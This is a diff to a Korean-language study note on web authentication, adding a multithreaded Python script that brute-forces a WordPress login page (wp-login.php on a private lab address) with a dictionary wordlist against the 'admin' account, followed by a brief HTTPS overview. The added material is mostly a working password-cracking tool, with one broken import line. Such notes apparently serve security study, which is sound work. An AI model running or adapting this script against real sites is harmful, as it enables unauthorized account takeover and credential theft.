@@ -375,5 +375,105 @@ Authorization의 값이 MD5 해시 값으로 되어 있기 때문에 디코딩�
 폼 기반 인증: 웹페이지에 사용자 아이디와 패스워드를 입력 할 수 있는 양식에 아이디 패스워드를 입력하고 로그인 버튼을 눌러서 웹 서버로 인증 정보를 전달하는 형태다.
 HTML의 form 태그와 input 태그를 이용하여 양식을 만들고 구현 한다. 데이터를 입력하면 HTTP나 HTTPS의 Get 또는 Post 메소드를 이용해 웹 서버로 인증을 요청하게 된다.
 {: .notice}
-{: .notice}
-{: .notice}
+
+```python
+from urllib.request import build_opener, HTTPCookieProcessor
+import http.cookiejar as cookielib
+from html.parser import HTMLParser
+from urllib.parser import HTMLParser
+from urllib.parse import urlencode
+from queue import Queue
+from threading import Thread
+
+num_threads = 5 #스레드 구동 개수
+wordlist = 'dictionary.txt'
+
+targeturl = 'http://192.168.0.14/blog/wp-login.php'
+targetpost = 'http://192.168.0.14/blog/wp-login.php'
+
+username_field = 'log'
+pass_field = 'pwd'
+check  = 'update'
+isBingo = False
+
+class myHTMLParser(HTMLParser):
+    def __init__(self):
+        HTMLParser.__init__(self)
+        self.tagResult = {}
+        
+    def handle_starttag(self, tag, attrs):
+        if tag == 'input':
+            tagname = None
+            tagvalue = None
+            for name, value in attrs:
+                if name == 'name':
+                    tagname = value
+                if name == 'value':
+                    tagvalue = value
+                    
+            if tagname is not None:
+                self.tagResult[tagname] = tagvalue
+                
+def webAuthCracker(q, username):
+    global isBingo
+    while not q.empty() and not isBingo:
+        password = q.get().rstrip()
+        cookies = cookielib.FileCookieJar('cookies')
+        opener = build_opener(HTTPCookieProcessor(cookies))
+        res = opener.open(targeturl)
+        htmlpage = res.read().decode()
+        print('+++TRYING %s : %s' %(username, password))
+        parseR = myHTMLParser()
+        parseR.feed(htmlpage)
+        inputtags = parseR.tagResult
+        inputtags[username_field] = username
+        inputtags[pass_field] = password
+        
+        loginData = urlencode(inputtags).encode('utf-8')
+        loginRes = opener.open(targetpost, data=loginData)
+        loginResult = loginRes.read().decode()
+        
+        if check in loginResult:
+            isBingo = True
+            print('---CRACKING SUCCESS!')
+            print('---Username[%s] Password[%s]' %(username, password))
+            print('---Waiting Other Threads Terminated..')
+            
+def main():
+    username = 'admin'
+    q = Queue()
+    with open(wordlist, 'rt') as f:
+        words = f.readlines()
+        
+        for word in words:
+            word = word.rstrip()
+            q.put(word)
+            
+        print('+++[%s] CRACKING WEB AUTH START..' %username)
+        for i in range(num_threads):
+            t = Thread(target=webAuthCracker, args=(q, username))
+            t.start()
+            
+if __name__ == '__main__':
+    main()
+```
+
+---
+### HTTPS
+---
+
+* HTTPS(HTTP over SSL)
+* TCP 포트 443번
+* TLS(Transport Layer Security), SSL(Secure Socket Layer) 프로토콜로 세션 데이터를 암호화하여 통신한다.
+* 웹 사이트의 인증에 필요한 개인 정보나 중요한 데이터를 해킹으로 보호한다.
+{: .notice--info}
+
+```
+#HTTPS 통신 개요
+
+ 아이디/암호 --> 암호화 ----- HTTPS ------> 복호화 --> 아이디/암호
+(웹 브라우저)            "zXhh87kkk5aB"            (웹 서버)
+                           |
+						   |
+                         (해커)
+```
